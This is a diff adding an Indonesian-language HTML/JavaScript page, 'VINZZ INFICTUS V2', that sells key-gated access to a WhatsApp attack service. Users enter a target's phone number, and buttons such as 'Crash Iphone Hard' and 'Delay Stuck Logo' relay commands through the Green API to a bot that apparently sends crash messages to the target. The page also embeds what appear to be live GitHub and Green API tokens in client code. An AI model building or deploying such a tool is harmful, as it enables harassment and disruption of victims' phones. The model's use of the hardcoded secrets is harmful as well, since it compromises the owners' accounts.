@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>VINZZ INFICTUS V2</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      background: #0f0f1a;
+      font-family: sans-serif;
+      color: white;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+    .container {
+      margin: 50px auto;
+      max-width: 450px;
+      padding: 20px;
+      background: #1e1e2f;
+      border-radius: 10px;
+    }
+    input, button, select {
+      padding: 10px;
+      margin: 10px;
+      width: 90%;
+      font-size: 16px;
+      border-radius: 6px;
+      border: none;
+    }
+    button {
+      background: #007bff;
+      color: white;
+    }
+    .logout {
+      background: red;
+      margin-top: 10px;
+    }
+    .hidden {
+      display: none;
+    }
+    .info {
+      font-size: 13px;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container" id="loginPage">
+  <h2>Login Key</h2>
+  <input type="text" id="keyInput" placeholder="Masukkan Kunci"/>
+  <button onclick="login()">Login</button>
+</div>
+
+<div class="container hidden" id="mainPage">
+  <h2>VINZZ INFICTUS V2 VVIP</h2>
+  <input type="text" id="numberInput" placeholder="Masukkan Nomor 62xx">
+  <button onclick="sendAction('Delay Stuck Logo')">Delay Stuck Logo</button>
+  <button onclick="sendAction('Crash Iphone Hard')">Crash Iphone Hard</button>
+  <button onclick="sendAction('Delay Invisible Hard')">Delay Invisible Hard</button>
+  <p><strong>Status:</strong> <span id="serverStatus" style="color:lime;">Server Aktif</span></p>
+  <p><strong>Info:</strong> Selamat datang, user VIP!</p>
+  <button class="logout" onclick="logout()">Logout</button>
+  <p class="info">
+    &copy; VINZZ INFICTUS <br>
+    <a href="https://t.me/Justvinzx" target="_blank" style="color:#00f;">SUPPORT</a>
+  </p>
+</div>
+
+<div class="container hidden" id="adminPage">
+  <h2>Admin Panel</h2>
+
+  <label>Status Server:</label>
+  <select id="statusSelect">
+    <option value="online">Online</option>
+    <option value="offline">Offline</option>
+  </select>
+  <button onclick="saveStatus()">Simpan</button>
+
+  <hr>
+  <h3>Tambah Key Baru</h3>
+  <input type="text" id="newKey" placeholder="Masukkan Key Baru">
+  <input type="datetime-local" id="expiryDate" />
+  <select id="roleSelect">
+    <option value="user">User</option>
+    <option value="admin">Admin</option>
+  </select>
+  <button onclick="addNewKey()">Tambah Key</button>
+
+  <hr>
+  <h3>Daftar Key Aktif</h3>
+  <div id="keyList" style="text-align:left;"></div>
+
+  <button class="logout" onclick="logout()">Logout</button>
+</div>
+
+<script>
+  const GITHUB_TOKEN = "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"; // GANTI
+  const GITHUB_USERNAME = "justvinzoffc";
+  const GITHUB_REPO = "key-database";
+  const FILE_PATH = "status.json";
+  const KEYS_FILE_PATH = "keys.json";
+
+  const greenAPI_idInstance = "7105273056"; // GANTI
+  const greenAPI_apiToken = "6eca424994d64742a4b17f77dfc41ff039ab15a084c54c89bc"; // GANTI
+  const adminTarget = "6285817982811";
+  const chatIdAdmin = adminTarget + "@c.us";
+
+  function login() {
+    const inputKey = document.getElementById("keyInput").value;
+
+    fetch(`https://raw.githubusercontent.com/${GITHUB_USERNAME}/${GITHUB_REPO}/main/${KEYS_FILE_PATH}`)
+      .then(res => res.json())
+      .then(data => {
+        const foundKey = data.keys.find(k => k.key === inputKey);
+        const now = new Date();
+
+        if (foundKey && new Date(foundKey.expires) > now) {
+          document.getElementById("loginPage").classList.add("hidden");
+
+          if (foundKey.isAdmin === true) {
+            document.getElementById("adminPage").classList.remove("hidden");
+            loadStatusForAdmin();
+            loadKeysForAdmin();
+          } else {
+            document.getElementById("mainPage").classList.remove("hidden");
+            loadStatusFromGitHub();
+          }
+
+        } else {
+          alert("Kunci tidak valid atau sudah expired!");
+        }
+      });
+  }
+
+  function logout() {
+    location.reload();
+  }
+
+  async function checkServerStatus() {
+    try {
+      const res = await fetch(`https://raw.githubusercontent.com/${GITHUB_USERNAME}/${GITHUB_REPO}/main/${FILE_PATH}`);
+      const data = await res.json();
+      return data.serverStatus === "online";
+    } catch {
+      return true;
+    }
+  }
+
+  async function sendAction(action) {
+    const number = document.getElementById("numberInput").value;
+    if (!number) return alert("Nomor belum diisi!");
+    const isOnline = await checkServerStatus();
+    if (!isOnline) return alert("Server sedang offline.");
+
+    const command = action === "Delay Stuck Logo" ? `.the-killer ${number}` :
+                    action === "Crash Iphone Hard" ? `.the-blank ${number}` :
+                    `.the-invis ${number}`;
+
+    const res = await fetch(`https://api.green-api.com/waInstance${greenAPI_idInstance}/sendMessage/${greenAPI_apiToken}`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chatId: chatIdAdmin,
+        message: command
+      })
+    });
+
+    if (res.ok) {
+      alert("✅ Bug Succes Send To Target!!");
+    } else {
+      alert("❌ Bug Failed Send To Target!!");
+    }
+  }
+
+  function updateStatusDisplay(status) {
+    const el = document.getElementById("serverStatus");
+    if (!el) return;
+    el.textContent = status === "online" ? "Server Aktif" : "Server Offline";
+    el.style.color = status === "online" ? "lime" : "red";
+  }
+
+  function loadStatusFromGitHub() {
+    fetch(`https://raw.githubusercontent.com/${GITHUB_USERNAME}/${GITHUB_REPO}/main/${FILE_PATH}`)
+      .then(res => res.json())
+      .then(data => updateStatusDisplay(data.serverStatus))
+      .catch(() => updateStatusDisplay("online"));
+  }
+
+  function loadStatusForAdmin() {
+    fetch(`https://raw.githubusercontent.com/${GITHUB_USERNAME}/${GITHUB_REPO}/main/${FILE_PATH}`)
+      .then(res => res.json())
+      .then(data => {
+        document.getElementById("statusSelect").value = data.serverStatus || "online";
+      });
+  }
+
+  async function saveStatus() {
+    const status = document.getElementById("statusSelect").value;
+    const res = await fetch(`https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents/${FILE_PATH}`, {
+      headers: {
+        Authorization: `token ${GITHUB_TOKEN}`,
+        Accept: "application/vnd.github.v3+json"
+      }
+    });
+    const file = await res.json();
+
+    const result = await fetch(`https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents/${FILE_PATH}`, {
+      method: "PUT",
+      headers: {
+        Authorization: `token ${GITHUB_TOKEN}`,
+        Accept: "application/vnd.github.v3+json"
+      },
+      body: JSON.stringify({
+        message: `Update status to ${status}`,
+        content: btoa(JSON.stringify({ serverStatus: status }, null, 2)),
+        sha: file.sha
+      })
+    });
+
+    alert(result.ok ? "Status server berhasil disimpan!" : "Gagal menyimpan status.");
+  }
+
+  async function addNewKey() {
+    const newKey = document.getElementById("newKey").value.trim();
+    const expiry = document.getElementById("expiryDate").value;
+    const role = document.getElementById("roleSelect").value;
+
+    if (!newKey || !expiry) return alert("Isi semua kolom.");
+
+    const res = await fetch(`https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents/${KEYS_FILE_PATH}`, {
+      headers: { Authorization: `token ${GITHUB_TOKEN}` }
+    });
+    const file = await res.json();
+    const keysJson = JSON.parse(atob(file.content));
+
+    const newEntry = {
+      key: newKey,
+      expires: new Date(expiry).toISOString()
+    };
+    if (role === "admin") newEntry.isAdmin = true;
+
+    keysJson.keys.push(newEntry);
+
+    const result = await updateKeysOnGitHub(keysJson.keys, file.sha, "Tambah key: " + newKey);
+    alert(result.ok ? "Key ditambahkan!" : "Gagal menambah key");
+    loadKeysForAdmin();
+  }
+
+  async function loadKeysForAdmin() {
+    const res = await fetch(`https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents/${KEYS_FILE_PATH}`);
+    const file = await res.json();
+    const sha = file.sha;
+    const keysJson = JSON.parse(atob(file.content));
+    const now = new Date();
+    const active = keysJson.keys.filter(k => new Date(k.expires) > now);
+    const expired = keysJson.keys.filter(k => new Date(k.expires) <= now);
+
+    if (expired.length > 0) {
+      await updateKeysOnGitHub(active, sha, "Hapus key expired");
+      alert("Key expired dihapus otomatis: " + expired.map(k => k.key).join(", "));
+    }
+
+    renderKeyList(active, sha);
+  }
+
+  function renderKeyList(keys, sha) {
+    const div = document.getElementById("keyList");
+    div.innerHTML = "";
+    keys.forEach(k => {
+      const role = k.isAdmin ? "(Admin)" : "(User)";
+      div.innerHTML += `
+        <div>
+          <strong>${k.key}</strong> ${role} - <em>${new Date(k.expires).toLocaleString()}</em>
+          <button onclick="deleteKey('${k.key}', '${sha}')">Hapus</button>
+        </div>`;
+    });
+  }
+
+  async function deleteKey(keyToDelete, sha) {
+    const res = await fetch(`https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents/${KEYS_FILE_PATH}`);
+    const file = await res.json();
+    const keysJson = JSON.parse(atob(file.content));
+    const updated = keysJson.keys.filter(k => k.key !== keyToDelete);
+    const result = await updateKeysOnGitHub(updated, file.sha, "Hapus key: " + keyToDelete);
+    alert(result.ok ? "Key berhasil dihapus!" : "Gagal menghapus key");
+    loadKeysForAdmin();
+  }
+
+  async function updateKeysOnGitHub(keysArray, sha, message) {
+    return fetch(`https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents/${KEYS_FILE_PATH}`, {
+      method: "PUT",
+      headers: {
+        Authorization: `token ${GITHUB_TOKEN}`,
+        Accept: "application/vnd.github.v3+json"
+      },
+      body: JSON.stringify({
+        message: message,
+        content: btoa(JSON.stringify({ keys: keysArray }, null, 2)),
+        sha: sha
+      })
+    });
+  }
+</script>
+
+</body>
+  </html>
